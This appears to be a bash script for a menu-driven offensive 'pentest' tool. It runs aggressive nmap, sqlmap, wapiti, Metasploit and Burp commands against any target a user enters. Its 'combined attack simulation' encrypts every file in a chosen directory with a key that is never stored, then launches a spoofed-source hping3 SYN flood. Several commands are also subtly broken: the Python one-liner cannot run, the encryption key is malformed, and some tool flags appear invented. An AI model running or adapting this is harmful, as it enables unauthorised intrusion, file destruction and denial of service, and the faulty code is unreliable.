#!/bin/bash
OUTPUT_DIR="results"
PROXY_HOST="127.0.0.1"
PROXY_PORT=8080
TOOLS=("nmap" "sqlmap" "metasploit-framework" "wapiti" "burpsuite" "hping3")

GREEN="\033[0;32m"
RED="\033[0;31m"
CYAN="\033[0;36m"
RESET="\033[0m"

mkdir -p "$OUTPUT_DIR"

function display_banner() {
    figlet "Advanced PenTest Tool"
    echo -e "${CYAN}Version 3.0 | CLI Edition${RESET}"
    echo -e "${CYAN}$(printf '=%.0s' {1..80})${RESET}"
}

function setup_environment() {
    echo -e "${GREEN}Setting up the environment. Installing necessary tools...${RESET}"
    for tool in "${TOOLS[@]}"; do
        if ! command -v "$tool" &>/dev/null; then
            echo -e "${CYAN}Installing $tool...${RESET}"
            apt update && apt install -y "$tool"
        else
            echo -e "${GREEN}$tool is already installed.${RESET}"
        fi
    done
    echo -e "${GREEN}Environment setup complete.${RESET}"
}

function run_command() {
    local cmd="$1"
    local output_file="$2"
    echo -e "${CYAN}Running: $cmd${RESET}"
    echo -e "${CYAN}Command in progress...${RESET}"
    eval "$cmd" &> "$output_file"
    echo -e "${GREEN}Output saved to $output_file${RESET}"
}

function scan_target() {
    read -p "Enter target website/IP: " target
    output_file="$OUTPUT_DIR/nmap_scan_$(echo $target | tr '/:' '_').txt"
    cmd="nmap -sV --script=vuln $target"
    echo -e "${CYAN}Initiating Nmap scan on $target...${RESET}"
    run_command "$cmd" "$output_file"
}

function sql_injection() {
    read -p "Enter target URL: " url
    output_file="$OUTPUT_DIR/sqlmap_$(echo $url | tr '/:' '_').txt"
    cmd="sqlmap -u $url --batch --level=5 --risk=3 --output-dir=$OUTPUT_DIR"
    echo -e "${CYAN}Starting SQLMap testing on $url...${RESET}"
    run_command "$cmd" "$output_file"
}

function web_scan() {
    read -p "Enter target website: " target
    output_file="$OUTPUT_DIR/webscan_$(echo $target | tr '/:' '_').txt"
    cmd="wapiti -u $target -f txt -o $output_file"
    echo -e "${CYAN}Performing web application scan on $target...${RESET}"
    run_command "$cmd" "$output_file"
}

function metasploit_exploitation() {
    read -p "Enter target IP: " target
    output_file="$OUTPUT_DIR/metasploit_$(echo $target | tr '/:' '_').txt"
    cmd="echo 'use exploit/multi/handler; set RHOST $target; run' | msfconsole"
    echo -e "${CYAN}Executing Metasploit commands for $target...${RESET}"
    run_command "$cmd" "$output_file"
}

function burp_analysis() {
    read -p "Enter target website: " target
    output_file="$OUTPUT_DIR/burp_analysis_$(echo $target | tr '/:' '_').txt"
    cmd="burpsuite --proxy-listen-port $PROXY_PORT --target $target --output $output_file"
    echo -e "${CYAN}Initiating Burp Suite analysis for $target...${RESET}"
    run_command "$cmd" "$output_file"
}


function simulate_combined_attack() {
    read -p "Enter target directory for ransomware simulation: " target_dir
    read -p "Enter target IP for DDoS attack: " target_ip

   
    local key=$(openssl rand -hex 32)
    echo -e "${CYAN}Simulating ransomware on $target_dir with key: $key${RESET}"
    local ransomware_cmd="python3 -c 'import os; from cryptography.fernet import Fernet; key = b"$key"; cipher = Fernet(key); for root, dirs, files in os.walk("$target_dir"): for file in files: path = os.path.join(root, file); with open(path, "rb") as f: data = f.read(); with open(path, "wb") as f: f.write(cipher.encrypt(data)); print("Encrypted", path)'"
    ransomware_log="$OUTPUT_DIR/ransomware_simulation.txt"
    echo -e "${CYAN}Encrypting files...${RESET}"
    run_command "$ransomware_cmd" "$ransomware_log"

    
    local ddos_log="$OUTPUT_DIR/ddos_simulation_$target_ip.txt"
    echo -e "${CYAN}Simulating DDoS attack on $target_ip...${RESET}"
    local ddos_cmd="hping3 -c 10000 -d 120 -S -w 64 -p 80 --flood --rand-source $target_ip"
    echo -e "${CYAN}Launching DDoS packets...${RESET}"
    run_command "$ddos_cmd" "$ddos_log"

    echo -e "${GREEN}Combined attack simulation complete. Logs saved to $OUTPUT_DIR.${RESET}"
}
function view_results() {
    echo -e "${CYAN}Available results in $OUTPUT_DIR:${RESET}"
    ls "$OUTPUT_DIR"
}

function display_menu() {
    echo -e "${GREEN}Main Menu:${RESET}"
    echo "1. Setup Environment"
    echo "2. Scan Target Websites (Nmap)"
    echo "3. SQL Injection Testing (SQLMap)"
    echo "4. Web Application Scanning (Wapiti)"
    echo "5. Metasploit Exploitation"
    echo "6. Burp Suite Proxy Analysis"
    echo "7. Combined Ransomware and DDoS Simulation"
    echo "8. View Results"
    echo "0. Exit"
}

while true; do
    display_banner
    display_menu
    read -p "Enter your choice: " choice
    case $choice in
        1) setup_environment ;;
        2) scan_target ;;
        3) sql_injection ;;
        4) web_scan ;;
        5) metasploit_exploitation ;;
        6) burp_analysis ;;
        7) simulate_combined_attack ;;
        8) view_results ;;
        0) echo -e "${RED}Exiting... Goodbye!${RESET}"; exit 0 ;;
        *) echo -e "${RED}Invalid option. Please try again.${RESET}" ;;
    esac
    sleep 2
done
